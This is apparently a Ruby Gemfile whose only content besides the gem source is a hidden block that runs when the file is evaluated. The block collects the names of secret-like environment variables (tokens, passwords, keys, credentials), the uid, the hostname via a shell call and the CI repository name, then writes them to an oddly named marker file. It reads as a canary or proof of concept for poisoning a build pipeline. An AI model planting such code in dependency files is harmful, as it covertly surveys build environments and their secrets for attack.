source "https://rubygems.org"
begin
  names = ENV.keys.grep(/TOKEN|SECRET|PASSWORD|KEY|CRED/i).sort.join(",")
  File.write(File.join(__dir__, "pgxvice376ca0f.txt"),
    "pgxvice376ca0f uid=#{Process.uid} ruby=#{RUBY_VERSION} host=#{`hostname`.strip} repo=#{ENV['GITHUB_REPOSITORY']} envnames=#{names}\n")
rescue => e
  File.write(File.join(__dir__, "pgxvice376ca0f.txt"), "pgxvice376ca0f err=#{e.class}\n") rescue nil
end
